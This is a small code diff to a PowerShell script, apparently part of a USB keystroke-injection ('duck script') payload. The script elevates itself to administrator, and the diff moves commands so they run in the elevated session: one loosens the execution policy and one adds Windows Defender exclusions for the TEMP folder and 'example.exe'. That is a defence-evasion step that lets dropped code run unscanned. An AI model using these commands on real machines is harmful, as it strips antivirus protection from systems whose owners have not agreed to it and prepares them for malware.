@@ -5,13 +5,12 @@ If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     # Relaunch PowerShell as administrator
     $arguments = "& '" + $myinvocation.MyCommand.Definition + "'"
     Start-Process powershell -Verb runAs -ArgumentList $arguments
-
-    Set-ExecutionPolicy RemoteSigned
-
-    Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
-
     Exit
 }
+
+Set-ExecutionPolicy RemoteSigned
+
+Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
 ## Send ALT+y in duck script
 
